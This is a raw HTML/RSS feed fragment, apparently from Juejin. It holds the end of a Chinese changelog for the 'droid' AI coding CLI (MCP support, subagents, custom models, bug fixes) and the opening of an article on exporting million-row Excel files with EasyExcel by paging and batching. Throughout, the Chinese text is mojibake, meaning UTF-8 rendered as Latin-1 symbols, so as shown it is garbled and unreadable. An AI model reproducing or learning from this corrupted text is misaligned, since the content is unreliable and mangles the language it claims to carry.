<li>ä¿®å¤ MCP çŠ¶æ€æŒ‡ç¤ºå™¨ï¼Œä»…åœ¨å®é™…é…ç½® MCP servers æ—¶æ˜¾ç¤º</li>
<li>ä¿®å¤æ¶ˆæ¯åˆ—è¡¨é—ªçƒ</li>
<li>æ·»åŠ å¯¹æ·»åŠ  MCP servers æ—¶è‡ªå®šä¹‰ headers çš„æ”¯æŒ</li>
<li>ä¿®å¤å£°éŸ³æ–‡ä»¶æœªåŒ…å«åœ¨ SEA äºŒè¿›åˆ¶ç‰ˆæœ¬ä¸­çš„é—®é¢˜</li>
<li>ä¿®å¤ Ctrl+C ä¸­æ–­æ¶ˆæ¯ä»…æ˜¾ç¤ºç»™ç”¨æˆ·è€Œä¸å‡ºç°åœ¨æ—¥å¿—ä¸­ä»¥è·å¾—æ›´æ¸…æ™°çš„è¾“å‡º</li>
<li>è§£å†³ tool å–æ¶ˆå tool ä½¿ç”¨é”™è¯¯åœ°å‡ºç°åœ¨ç”¨æˆ·æ¶ˆæ¯ä¸­çš„é—®é¢˜</li>
</ul>
<h2 data-id="heading-94">10æœˆ30æ—¥ v0.22.6</h2>
<h3 data-id="heading-95">æ–°åŠŸèƒ½</h3>
<p><strong>MCP æ”¹ç‰ˆ</strong> - Model Context Protocol å®ç°çš„å®Œå…¨æ”¹é©ï¼ˆæ–‡æ¡£å·²æ›´æ–°ï¼‰</p>
<h3 data-id="heading-96">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ OpenAI organization å­—æ®µçš„é—®é¢˜</li>
<li>åœ¨ Droidsï¼ˆsubagentsï¼‰èœå•ä¸­æ¢å¤å¯¼å…¥ï¼ˆIï¼‰é€‰é¡¹</li>
</ul>
<h2 data-id="heading-97">10æœˆ29æ—¥ v0.22.5</h2>
<h3 data-id="heading-98">Bug ä¿®å¤</h3>
<p><strong>é»˜è®¤ Model è¡Œä¸º</strong> - æ”¹è¿›é»˜è®¤ model è¡Œä¸º</p>
<h2 data-id="heading-99">10æœˆ28æ—¥ v0.22.4</h2>
<h3 data-id="heading-100">Bug ä¿®å¤</h3>
<p><strong>æ¢å¤æŠ¥å‘Šé¢„è§ˆ</strong> - é‡æ–°å¯ç”¨ reliability æŠ¥å‘Šçš„ HTML é¢„è§ˆï¼Œä»¥ä¾¿æ‚¨å¯ä»¥ç›´æ¥åœ¨ web ä¸­æŸ¥çœ‹å®ƒä»¬</p>
<p><strong>ä¿®å¤ --help æ–‡æœ¬</strong> - è¿è¡Œ droid exec --help ä¹‹å‰ä¸ºåœ¨ streaming mode ä¸­ä½¿ç”¨ droid exec æä¾›ä¸æ­£ç¡®çš„ä¿¡æ¯ã€‚ç°åœ¨å·²æ›´æ–°ä¸ºåŒ…å«æ­£ç¡®çš„æ ‡å¿—åç§°å’Œæ­£ç¡®çš„è¯´æ˜</p>
<h2 data-id="heading-101">10æœˆ21-25æ—¥ v0.22.3</h2>
<h3 data-id="heading-102">æ–°åŠŸèƒ½å’Œå¢å¼º</h3>
<p><strong>è¯¦ç»† transcript è§†å›¾ï¼ˆCtrl+Oï¼‰</strong> - æŒ‰ Ctrl+O æŸ¥çœ‹å…¨é¢çš„ tool æ‰§è¡Œè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€æœ‰ tool ç±»å‹çš„å®Œæ•´ç»†åˆ†ï¼ŒåŒ…æ‹¬ Executeã€Editã€MultiEditã€Create ç­‰</p>
<p><strong>å¯è‡ªå®šä¹‰çš„ completion å£°éŸ³</strong> - é…ç½®å‘½ä»¤å®Œæˆæ—¶çš„å£°éŸ³é€šçŸ¥ï¼Œæ”¯æŒåœ¨ focus mode å’Œè‡ªå®šä¹‰å£°éŸ³æ–‡ä»¶è·¯å¾„ä¸­ä½¿ç”¨ä¸åŒçš„å£°éŸ³</p>
<p><strong>Terminal è®¾ç½®æ”¯æŒ</strong> - æ·»åŠ å¯¹ Warpã€iTerm2 å’Œ macOS Terminal çš„è‡ªåŠ¨è®¾ç½®æ”¯æŒï¼Œå…·æœ‰è‡ªåŠ¨ terminal æŒ‡ç¤ºå™¨ä»¥æ”¹è¿›é›†æˆ</p>
<p><strong>PowerShell æ›´æ–°</strong> - ç°åœ¨ä½¿ç”¨ pwsh.exe ä»¥åœ¨ Windows ç³»ç»Ÿä¸Šè·å¾—æ›´å¥½çš„ PowerShell å…¼å®¹æ€§å’Œå¯é æ€§</p>
<p><strong>æ‹–æ”¾å›¾åƒæ”¯æŒ</strong> - é€šè¿‡æ‹–æ”¾å°†å›¾åƒé™„åŠ åˆ° CLI ä¼šè¯ï¼Œä»¥ä¾¿æ›´è½»æ¾åœ°è¿›è¡Œå¤šæ¨¡æ€äº¤äº’</p>
<p><strong>Subagents ä¸­çš„è‡ªå®šä¹‰ models</strong> - æ·»åŠ åœ¨é€šè¿‡ Task tool æ‰§è¡Œ subagents æ—¶ä½¿ç”¨è‡ªå®šä¹‰ models çš„æ”¯æŒ</p>
<p><strong>è‡ªå®šä¹‰ droid æè¿°</strong> - å°†è‡ªå®šä¹‰ droid æè¿°ç§»è‡³ Task tool ä»¥è·å¾—æ›´å¥½çš„ç»„ç»‡å’Œå¯ç”¨æ€§</p>
<p><strong>droid exec è‡ªå®šä¹‰ model æ”¯æŒ</strong> - æ·»åŠ å¯¹ droid exec ä¼šè¯ä¸­è‡ªå®šä¹‰ models çš„æ”¯æŒ</p>
<h3 data-id="heading-103">Bug ä¿®å¤å’Œç¨³å®šæ€§</h3>
<ul>
<li>è§£å†³ prompt caching é—®é¢˜ä»¥æé«˜æ€§èƒ½å¹¶é™ä½æˆæœ¬</li>
<li>æ·»åŠ  model ID æ—¥å¿—è®°å½•åˆ° CLI tool æ‰§è¡Œä»¥è·å¾—æ›´å¥½çš„å¯è§‚å¯Ÿæ€§</li>
<li>é™åˆ¶ Ctrl+O è§†å›¾ä¸­æ¸²æŸ“çš„æ¶ˆæ¯ä»¥æé«˜å¤§ transcripts çš„æ€§èƒ½</li>
<li>ä¿®å¤å£°éŸ³æ–‡ä»¶æœªåŒ…å«åœ¨ SEA äºŒè¿›åˆ¶ç‰ˆæœ¬ä¸­çš„é—®é¢˜</li>
<li>ä¿®å¤å¯¼è‡´æ„å¤–è¡Œä¸ºçš„ readonly å€¼æ›´æ”¹é—®é¢˜</li>
<li>ä¿®å¤ ExitSpecMode é—ªçƒé—®é¢˜ä»¥è·å¾—æ›´æµç•…çš„ç”¨æˆ·ä½“éªŒ</li>
<li>åˆ é™¤ settings ä¸­çš„é‡å¤è‡ªå®šä¹‰ models header</li>
<li>æ”¹è¿›å¯¹ legacy ä¼šè¯çš„ä¼šè¯æŒä¹…æ€§ä»¥ä¿æŒå‘åå…¼å®¹æ€§</li>
<li>ä¿®å¤ Windows ç³»ç»Ÿä¸Šçš„æ— é™æ¸²æŸ“é—®é¢˜</li>
<li>ä¿®å¤ 400 é”™è¯¯å¤„ç†å’ŒéªŒè¯</li>
<li>æ·»åŠ  model éªŒè¯é”™è¯¯æ¶ˆæ¯ä»¥æ›´å¥½åœ°è¿›è¡Œè°ƒè¯•</li>
<li>ä¿®å¤è¯ä¹¦åŠ è½½æ—¶é—´ï¼Œä»¥åœ¨æ—¥å¿—åˆå§‹åŒ–åå‘ç”Ÿ</li>
</ul>
<h2 data-id="heading-104">10æœˆ14-20æ—¥ v0.21.3</h2>
<h3 data-id="heading-105">æ–°åŠŸèƒ½å’Œå¢å¼º</h3>
<p><strong>MCP OAuth æ”¯æŒ</strong> - åœ¨ TUI ä¸­ä¸º Model Context Protocol æ·»åŠ  OAuth èº«ä»½éªŒè¯æ”¯æŒï¼Œä»¥å®ç°å®‰å…¨çš„ server è¿æ¥</p>
<p><strong>ç³»ç»Ÿè¯ä¹¦æ”¯æŒ</strong> - æ·»åŠ å¯¹åœ¨ Windows å’Œ macOS ä¸ŠåŠ è½½ç³»ç»Ÿè¯ä¹¦çš„æ”¯æŒï¼Œä»¥åŠé¢å¤–çš„ Windows ç³»ç»Ÿè¯ä¹¦æ”¯æŒ</p>
<p><strong>æ¨¡ç³Šæœç´¢å®ç°</strong> - æ–°çš„æ¨¡ç³Šæœç´¢ï¼Œä»¥æ”¹è¿› CLI å‘½ä»¤å’Œé€‰é¡¹å‘ç°</p>
<p><strong>Rewind fork å·¥ä½œæµ</strong> - æ·»åŠ ä»å¯¹è¯ä¼šè¯ä¸­çš„å…ˆå‰ç‚¹ rewind å’Œ fork çš„èƒ½åŠ›</p>
<p><strong>Bug æŠ¥å‘Šå¢å¼º</strong> - å‘ bug æŠ¥å‘Šæ·»åŠ ç‰ˆæœ¬ã€OS å’Œ shell ä¿¡æ¯ï¼Œä»¥æ›´å¥½åœ°è¿›è¡Œæ•…éšœæ’é™¤</p>
<p><strong>Subagent tool çš„å®æ—¶æ›´æ–°</strong> - ä½¿ç”¨ Task tool æ—¶æ·»åŠ å®æ—¶è¿›åº¦æ›´æ–°</p>
<p><strong>å¢å¼ºè‡ªå®šä¹‰ droid prompts</strong> - æ”¹è¿› prompts ä»¥é¼“åŠ±æ›´ä¸»åŠ¨åœ°ä½¿ç”¨è‡ªå®šä¹‰ droids</p>
<p><strong>Droid Shield å¯é€‰è®¾ç½®</strong> - ä½¿ Droid Shield æˆä¸ºå¯é…ç½®è®¾ç½®ï¼Œå¹¶æ”¯æŒåˆ‡æ¢</p>
<h3 data-id="heading-106">Bug ä¿®å¤å’Œç¨³å®šæ€§</h3>
<ul>
<li>å°† session_id æ·»åŠ åˆ° stream-json è¾“å‡ºæ ¼å¼ä»¥æ›´å¥½åœ°è¿›è¡Œè·Ÿè¸ªå’Œè°ƒè¯•</li>
<li>å¢å¼ºèº«ä»½éªŒè¯æµç¨‹ä»¥å®ç°æ›´æµç•…çš„ onboarding</li>
<li>é€šè¿‡åˆ é™¤å†—ä½™çš„ onboarding æ­¥éª¤ç®€åŒ–é¦–æ¬¡è¿è¡Œä½“éªŒ</li>
<li>ä¿®å¤é˜»æ­¢èº«ä»½éªŒè¯çš„ OAuth å›è°ƒ server ç«¯å£å†²çªé—®é¢˜</li>
<li>ä¿®å¤å¯¼è‡´ TLS é”™è¯¯çš„è¯ä¹¦åŠ è½½æ—¶é—´é—®é¢˜</li>
<li>æ”¹è¿›é”™è¯¯å…ƒæ•°æ®æ—¥å¿—è®°å½•ä»¥æ›´å¥½åœ°è¿›è¡Œè°ƒè¯•</li>
<li>ä¿®å¤ä¸åŒ shell ç¯å¢ƒä¸­çš„ terminal è®¾ç½®é—®é¢˜</li>
<li>å½“ ripgrepï¼ˆrgï¼‰åœ¨ PATH ä¸­ä¸å¯ç”¨æ—¶ï¼Œæä¾›æ›´å¥½çš„é”™è¯¯æ¶ˆæ¯</li>
<li>æ”¹è¿›å¯¹æ–‡ä»¶è·¯å¾„ä¸­æŸåçš„ unicode è§„èŒƒåŒ–çš„å¤„ç†</li>
<li>ä¿®å¤ impact level é»˜è®¤å€¼å¤„ç†</li>
</ul>
<h2 data-id="heading-107">9æœˆ30æ—¥ - 10æœˆ13æ—¥ v0.19.8</h2>
<h3 data-id="heading-108">æ–°åŠŸèƒ½å’Œå¢å¼º</h3>
<p><strong>droid exec Slack é›†æˆ</strong> - å‘ droid exec æ·»åŠ  slack_post_message toolï¼Œç”¨äºå‘ Slack channels å‘å¸ƒæ›´æ–°</p>
<p><strong>droid exec streaming JSON è¾“å…¥ mode</strong> - ä¸ºå¤š turn exec ä¼šè¯æ·»åŠ  streaming JSON è¾“å…¥ modeï¼Œä»¥å®ç°æ›´å¥½çš„è‡ªåŠ¨åŒ–å·¥ä½œæµ</p>
<p><strong>droid exec tool é…ç½®</strong> - æ·»åŠ åœ¨ droid exec ä¼šè¯ä¸­å¯ç”¨/ç¦ç”¨ç‰¹å®š tools çš„èƒ½åŠ›</p>
<p><strong>droid exec é¢„åˆ›å»ºä¼šè¯ IDs</strong> - æ·»åŠ å¯¹ droid exec ä¸­é¢„åˆ›å»ºä¼šè¯ IDs çš„æ”¯æŒï¼Œä»¥å®ç°æ›´å¥½çš„ä¼šè¯ç®¡ç†</p>
<p><strong>åˆå§‹ prompt æ”¯æŒ</strong> - æ·»åŠ é€šè¿‡å‘½ä»¤è¡Œä½¿ç”¨åˆå§‹ prompt å¯åŠ¨ TUI çš„æ”¯æŒ</p>
<p><strong>GLM-4.6 æ”¯æŒ</strong> - æ·»åŠ  GLM-4.6 çš„ LLM proxy æ”¯æŒï¼ŒåŒ…æ‹¬ Fireworksã€Baseten å’Œ DeepInfra providers</p>
<p><strong>Azure OpenAI å¯¹ GPT-5 çš„æ”¯æŒ</strong> - åœ¨ TUI ä¸­ä¸º GPT-5 Codex æ·»åŠ  Azure OpenAI æ”¯æŒ</p>
<p><strong>è‡ªå®šä¹‰ droid ç”Ÿæˆ</strong> - æ·»åŠ ä½¿ç”¨ LLM è‡ªåŠ¨ç”Ÿæˆè‡ªå®šä¹‰ droids ä»¥åŠ å¿«è®¾ç½®</p>
<p><strong>MCP å¯æµå¼ä¼ è¾“ HTTP servers</strong> - æ·»åŠ å¯¹å¯æµå¼ä¼ è¾“ HTTP MCP servers çš„æ”¯æŒ</p>
<p><strong>Model selector åˆ·æ–°</strong> - æ›´æ–° model selector UIï¼Œæ”¹è¿›ç»„ç»‡å’Œå›¾åƒæ”¯æŒè­¦å‘Š</p>
<p><strong>Tab é”®è‡ªåŠ¨å®Œæˆ</strong> - Tab é”®ç°åœ¨è‡ªåŠ¨å®Œæˆè‡ªå®šä¹‰å‘½ä»¤è€Œä¸æäº¤ï¼Œä»¥è·å¾—æ›´å¥½çš„ UX</p>
<h3 data-id="heading-109">Bug ä¿®å¤å’Œç¨³å®šæ€§</h3>
<p><strong>droid exec ä¼šè¯ç»§ç»­ä¿®å¤</strong> - ä¿®å¤ droid exec ä»¥æ­£ç¡®ç»§ç»­ç°æœ‰ä¼šè¯ï¼Œè€Œä¸æ˜¯è¦†ç›–ä¼šè¯æ•°æ®</p>
<ul>
<li>UI ä¸­ Codex models çš„åŠ¨æ€ reasoning æ ‡ç­¾</li>
<li>AGENTS.md æºè·¯å¾„ç°åœ¨æ˜¾ç¤ºåœ¨ settings ä¸­ä»¥æé«˜é€æ˜åº¦</li>
<li>å½“è‡ªå®šä¹‰ model JSON é…ç½®æŸåæ—¶æä¾›æ›´å¥½çš„é”™è¯¯æ¶ˆæ¯</li>
<li>å½“è‡ªåŠ¨æ›´æ–°ä¸å¯ç”¨æ—¶çš„æ‰‹åŠ¨æ›´æ–°è¯´æ˜</li>
<li>ä¿®å¤ task subagents åœ¨ä¸­æ­¢æ—¶æ­£ç¡®ç»ˆæ­¢</li>
<li>ä¿®å¤ Windows ç³»ç»Ÿä¸Šçš„æ–‡ä»¶é‡å‘½åé‡è¯•é€»è¾‘</li>
<li>ä¿®å¤ Windows ä¸Šçš„åæ–œæ æ¸²æŸ“é—®é¢˜</li>
<li>å¯¹è‡ªå®šä¹‰ subagents å¯é æ€§è¿›è¡Œé‡å¤§æ”¹è¿›</li>
<li>ä¿®å¤ task tool subagents prompt ä»¥å®ç°æ›´å¥½çš„æ‰§è¡Œ</li>
<li>åœ¨ spec mode ä¸­ä¸è¦åœ¨å–æ¶ˆçš„æ–‡ä»¶ç¼–è¾‘æ—¶åœæ­¢ agent</li>
<li>åœ¨æ‰§è¡Œ ripgrep ä¹‹å‰éªŒè¯å·¥ä½œç›®å½•æ˜¯å¦å­˜åœ¨</li>
<li>ä¿®å¤ subagents ä» TUI çˆ¶ä¼šè¯ç»§æ‰¿ model</li>
<li>æˆªæ–­å¤§ MCP tool ç»“æœä»¥é˜²æ­¢ä¸Šä¸‹æ–‡æº¢å‡º</li>
<li>ä½¿ç”¨ Fireworks cached input ä¿®å¤ /cost å‘½ä»¤</li>
<li>ä¸ºæ›´å¥½çš„è·Ÿè¸ªå‘ LLM è¯·æ±‚æ·»åŠ  user-agent header</li>
<li>é”å®šæ–‡ä»¶ç³»ç»Ÿæƒé™ä»¥æé«˜å®‰å…¨æ€§</li>
<li>ä¿®å¤ spec mode ä¸­å¤±è´¥ç¼–è¾‘è°ƒç”¨çš„æ¸²æŸ“</li>
<li>ä¿®å¤ compaction é€»è¾‘å¹¶åœ¨æ²¡æœ‰ tool ç»“æœçš„æƒ…å†µä¸‹é‡è¯•</li>
<li>åœ¨ compaction/caching ä¹‹å‰åº”ç”¨è¾“å‡ºè½¬æ¢</li>
<li>æŒä¹…åŒ–ä¼šè¯çš„ token ä½¿ç”¨æƒ…å†µä»¥å‡†ç¡®è·Ÿè¸ªæˆæœ¬</li>
<li>ä¿®å¤ /new å‘½ä»¤ä»¥æ­£ç¡®é‡ç½® timer å’Œ sessionId</li>
<li>ä¿®å¤æ²¡æœ‰ tool ç»“æœçš„ compaction é‡è¯•</li>
<li>ä½¿ç”¨ unicode è§„èŒƒåŒ–å›é€€ä¿®å¤ screenshot è¯»å–</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ« OOMï¼šEasyExcel ç™¾ä¸‡æ•°æ®å¯¼å‡ºæœ€ä½³å®è·µï¼ˆé™„å¼€ç®±å³ç”¨å¢å¼ºå·¥å…·ç±»ï¼‰]]></title>    <link>https://juejin.cn/post/7589932422654771236</link>    <guid>https://juejin.cn/post/7589932422654771236</guid>    <pubDate>2026-01-02T13:59:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654771236" data-draft-id="7589940210832179243" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ« OOMï¼šEasyExcel ç™¾ä¸‡æ•°æ®å¯¼å‡ºæœ€ä½³å®è·µï¼ˆé™„å¼€ç®±å³ç”¨å¢å¼ºå·¥å…·ç±»ï¼‰"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-02T13:59:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çš®çš®æ—551"/> <meta itemprop="url" content="https://juejin.cn/user/2447981921436084"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ« OOMï¼šEasyExcel ç™¾ä¸‡æ•°æ®å¯¼å‡ºæœ€ä½³å®è·µï¼ˆé™„å¼€ç®±å³ç”¨å¢å¼ºå·¥å…·ç±»ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2447981921436084/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çš®çš®æ—551
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T13:59:32.000Z" title="Fri Jan 02 2026 13:59:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æŠ¥è¡¨ä¸‹è½½ã€æ•°æ®äº¤æ¢ã€æ—¥å¿—å½’æ¡£... å¯¼å‡ºéœ€æ±‚æ— å¤„ä¸åœ¨ã€‚ä½†å½“æ•°æ®é‡è†¨èƒ€åˆ°åä¸‡ã€ç™¾ä¸‡çº§ï¼Œä¼ ç»Ÿ POI åˆ†åˆ†é’Ÿæ•™ä½ åšäººï¼š<code>å†…å­˜æº¢å‡º (OOM)</code>ã€<code>å¯¼å‡ºå¡æˆPPT</code>ã€<code>è¯·æ±‚è¶…æ—¶</code>Â æ¥è¸µè€Œè‡³ã€‚</p>
<p>åˆ«æ…Œï¼EasyExcel çš„ã€Œ<code>åˆ†é¡µæŸ¥è¯¢ + åˆ†æ‰¹å†™å…¥</code>ã€å¤§æ³•ï¼Œæ­£æ˜¯ä¸ºå¾æœæµ·é‡æ•°æ®è€Œç”Ÿï¼æœ¬æ–‡å°†å¸¦ä½ ï¼š</p>
<ul>
<li>ç§’æ‡‚ EasyExcel å¯¼å‡ºä¼˜åŒ–çš„æ ¸å¿ƒæ€æƒ³</li>
<li>æ‰‹æ’¸åˆ†é¡µå†™å…¥ä»£ç ï¼Œè½»æ¾holdä½ç™¾ä¸‡è¡Œ</li>
<li>å°è£…å¼€ç®±å³ç”¨çš„å¢å¼ºå·¥å…·ç±»ï¼Œç›´æ¥CVæ‹¿èµ°</li>
<li>è§£é”åŠ¨æ€åˆ†é¡µã€å¼‚æ­¥å¯¼å‡ºã€æ¨¡æ¿æ ·å¼ç­‰è¿›é˜¶æŠ€å·§</li>
</ul>
<h3 data-id="heading-0"><strong>ä¸€ã€ç—›ç‚¹ç›´å‡»ï¼šä¸ºä»€ä¹ˆä½ çš„å¯¼å‡ºä¼šå´©ï¼Ÿ</strong></h3>

























<table><thead><tr><th>ç—›ç‚¹</th><th>ç—‡çŠ¶</th><th>æ ¹æœ¬åŸå› </th></tr></thead><tbody><tr><td><strong>å†…å­˜æº¢å‡º (OOM)</strong></td><td>OutOfMemoryErrorå¼‚å¸¸</td><td>ä¸€æ¬¡æ€§åŠ è½½å…¨é‡æ•°æ®è¿›å†…å­˜</td></tr><tr><td><strong>å¯¼å‡ºé¾Ÿé€Ÿ/å¡æ­»</strong></td><td>é¡µé¢è½¬åœˆåœˆï¼Œæ¥å£è¶…æ—¶</td><td>å•æ¬¡å¤„ç†æ•°æ®é‡è¿‡å¤§ï¼ŒCPU/IO é˜»å¡</td></tr><tr><td><strong>æœåŠ¡èµ„æºè¢«æ¦¨å¹²</strong></td><td>å¯¼å‡ºæœŸé—´ï¼Œå…¶ä»–æ¥å£å“åº”å˜æ…¢</td><td>å¯¼å‡ºçº¿ç¨‹é•¿æ—¶é—´å ç”¨å¤§é‡èµ„æº</td></tr></tbody></table>
<p>EasyExcel çš„æ•‘å‘½ç¨»è‰ï¼š<code>åˆ†é¡µæŸ¥è¯¢ + åˆ†æ‰¹å†™å…¥</code></p>
<p>æ ¸å¿ƒæ€æƒ³å°±å…«å­—çœŸè¨€ï¼š<strong>åŒ–æ•´ä¸ºé›¶ï¼Œç»†åš¼æ…¢å’½ï¼</strong></p>
<ul>
<li><strong>åˆ†é¡µæŸ¥è¯¢ï¼š</strong> Â æŒ‰æ‰¹æ¬¡ä»æ•°æ®åº“å–æ•°æ® (å¦‚æ¯æ¬¡ 2000 æ¡)</li>
<li><strong>åˆ†æ‰¹å†™å…¥ï¼š</strong> Â å–ä¸€æ‰¹ï¼Œå†™ä¸€æ‰¹åˆ° Excel</li>
<li><strong>é‡Šæ”¾å†…å­˜ï¼š</strong> Â ç«‹åˆ»æ¸…ç©ºå½“å‰æ‰¹æ¬¡æ•°æ®ï¼Œå›æ”¶å†…å­˜</li>
<li><strong>å¾ªç¯å¾€å¤ï¼š</strong> Â ç›´åˆ°æ‰€æœ‰æ•°æ®å¤„ç†å®Œæ¯•</li>
</ul>
<h5 data-id="heading-1"><strong>ä¸åŒè§„æ¨¡æ•°æ®çš„ä¼˜åŒ–ç­–ç•¥æŒ‡å—</strong></h5>

































